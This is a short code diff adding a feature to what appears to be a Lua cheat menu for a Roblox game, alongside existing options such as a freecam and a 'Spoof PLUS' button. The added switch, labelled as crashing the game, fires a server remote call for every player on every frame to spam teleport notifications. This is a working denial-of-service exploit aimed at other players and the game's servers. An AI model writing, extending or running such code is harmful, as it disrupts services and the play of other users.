@@ -901,6 +901,25 @@ Extra:AddSwitch("Freecam",function(b)
 	end
 end)
 
+local notifloop = nil
+
+Extra:AddSwitch("SPAM TELEPORT NOTIFICATION ALL (Crashes Game)",function(bool)
+	if bool then
+		if notifloop then
+			notifloop:Disconnect()
+			notifloop = nil
+		end
+		notifloop = service("RunService").Heartbeat:Connect(function()
+			for _, player in pairs(Players:GetPlayers()) do
+				coroutine.wrap(Connection.InvokeServer)(Connection,154,player.UserId,{})
+			end
+		end)
+	else
+		notifloop:Disconnect()
+		notifloop = nil
+	end
+end)
+
 local oldplusfunc = nil
 
 Extra:AddButton("Spoof PLUS",function()
